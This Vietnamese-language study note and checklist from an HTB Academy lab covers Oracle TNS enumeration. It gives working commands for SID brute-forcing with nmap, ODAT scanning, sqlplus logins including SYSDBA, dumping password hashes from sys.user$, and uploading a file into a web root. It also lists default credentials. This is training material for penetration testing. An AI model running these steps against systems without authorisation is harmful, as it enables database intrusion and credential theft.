# Oracle TNS Enumeration - HTB Academy

## Tổng quan

Oracle TNS, viết tắt của Transparent Network Substrate, là giao thức giúp Oracle client/app giao tiếp với Oracle Database qua mạng.

Mô hình kết nối:

```text
Client/App -> TNS Listener -> Oracle Database Instance
```

Port mặc định:

```text
TCP/1521
```

Khi thấy port `1521` mở và service là `oracle-tns`, cần thực hiện Oracle enumeration.

## Thành phần quan trọng

### TNS Listener

Listener là service lắng nghe kết nối từ client và chuyển request đến đúng Oracle database instance hoặc service.

### SID

`SID` là System Identifier, định danh một database instance cụ thể.

Ví dụ phổ biến:

```text
XE
ORCL
PDB1
```

Nếu không biết SID/service name, có thể cần brute-force bằng Nmap hoặc ODAT.

### Service Name

`SERVICE_NAME` là tên service logic mà client dùng để kết nối database.

### tnsnames.ora

File cấu hình phía client, dùng để resolve tên service thành host, port, protocol và service name/SID.

Ví dụ:

```text
ORCL =
  (DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

### listener.ora

File cấu hình phía server, định nghĩa listener lắng nghe ở đâu và quản lý service/instance nào.

## Dangerous Defaults

Một số điểm cần nhớ:

```text
Oracle 9 default password: CHANGE_ON_INSTALL
Oracle DBSNMP default password: dbsnmp
Port mặc định: 1521
```

Các môi trường cũ hoặc cấu hình sai có thể vẫn dùng default credential.

## Tools

### Nmap

Scan Oracle TNS:

```bash
sudo nmap -p1521 -sV <IP> --open
```

SID brute-force:

```bash
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```

### ODAT

ODAT là Oracle Database Attacking Tool, dùng để enumerate và kiểm tra cấu hình/lỗ hổng Oracle.

Test ODAT:

```bash
./odat.py -h
```

Chạy full scan:

```bash
./odat.py all -s <IP>
```

Nếu ODAT tìm được credential, ví dụ:

```text
scott/tiger
```

thì dùng `sqlplus` để login.

### SQLPlus

Login Oracle:

```bash
sqlplus scott/tiger@<IP>/SID_trong_db_brute
```

Thử login với quyền SYSDBA:

```bash
sqlplus scott/tiger@<IP>/SID_trong_db_brute as sysdba
```

## Query cơ bản

Liệt kê table:

```sql
select table_name from all_tables;
```

Xem quyền/role hiện tại:

```sql
select * from user_role_privs;
```

Đọc hash user nếu có quyền cao:

```sql
select name, password from sys.user$;
```

## File Upload qua ODAT UTL_FILE

Tạo file test:

```bash
echo "Oracle File Upload Test" > testing.txt
```

Upload lên webroot Windows:

```bash
./odat.py utlfile -s <IP> -d SID_tim_dc -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Kiểm tra bằng curl:

```bash
curl -X GET http://<IP>/testing.txt
```

## Quy trình tư duy

```text
Scan 1521
-> xác định oracle-tns
-> brute-force SID/service name
-> dùng ODAT để enum
-> tìm valid credential
-> login bằng sqlplus
-> kiểm tra role/privilege
-> thử sysdba nếu hợp lệ
-> enum tables/users/hash
-> nếu có quyền file write, test upload file lành tính
```

---
# Oracle TNS Lab Checklist

## 1. Xác định service

- [ ] Scan port Oracle TNS:

```bash
sudo nmap -p1521 -sV <IP> --open
```
-  Ghi lại:
    -  IP target
    -  Port
    -  Service: `oracle-tns`
    -  Version Oracle nếu có
    -  Trạng thái listener, ví dụ `unauthorized`
## 2. Brute-force SID/service name
-  Chạy Nmap SID brute-force:
    
```
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```
-  Ghi lại SID tìm được, ví dụ:
    
```
XE
ORCL
PDB1
```
## 3. Chuẩn bị ODAT
-  Kiểm tra ODAT có sẵn không:
    

```
locate odat.py
```

-  Nếu đang ở thư mục ODAT, test:
    
```
./odat.py -h
```

-  Nếu chưa có, cài theo hướng dẫn lab.
    
## 4. Chạy ODAT enumeration
-  Chạy scan tổng quát:
    
```
./odat.py all -s <IP>
```

-  Ghi lại:
    
    -  SID/service name
        
    -  version
        
    -  valid credentials
        
    -  locked accounts
        
    -  misconfiguration
        
    -  module nào cho kết quả đáng chú ý
        

## 5. Login bằng SQLPlus
-  Kiểm tra `sqlplus`:
    

```
sqlplus -v
```

-  Login thường:
    
```
sqlplus <user>/<password>@<IP>/<SID>
```

Ví dụ:

```
sqlplus scott/tiger@10.129.204.235/XE
```

-  Nếu có khả năng, thử SYSDBA:
    
```
sqlplus <user>/<password>@<IP>/<SID> as sysdba
```

## 6. Enumeration trong SQLPlus

-  Liệt kê tables:
    

```
select table_name from all_tables;
```

-  Xem role của user hiện tại:
    

```
select * from user_role_privs;
```

-  Xem user hiện tại:
    

```
show user;
```

-  Kiểm tra database name nếu cần:
    

```
select name from v$database;
```

-  Nếu có quyền cao, kiểm tra hash:
    

```
select name, password from sys.user$;
```

## 7. Kiểm tra file write nếu có quyền

-  Xác định OS target:
    
    -  Linux webroot thường: `/var/www/html`
        
    -  Windows IIS webroot thường: `C:\inetpub\wwwroot`
        
-  Tạo file test lành tính:
    
```
echo "Oracle File Upload Test" > testing.txt
```

-  Upload bằng ODAT UTL_FILE:
    

```
./odat.py utlfile -s <IP> -d <SID> -U <user> -P <password> --sysdba --putFile <remote_dir> testing.txt ./testing.txt
```

-  Kiểm tra bằng HTTP nếu upload vào webroot:
    

```
curl http://<IP>/testing.txt
```

## 8. Ghi chú report/lab

-  Oracle TNS có expose không?
    
-  SID/service name là gì?
    
-  Có default credential không?
    
-  User nào login được?
    
-  User có role gì?
    
-  Có login được `as sysdba` không?
    
-  Có đọc được hash không?
    
-  Có ghi file được không?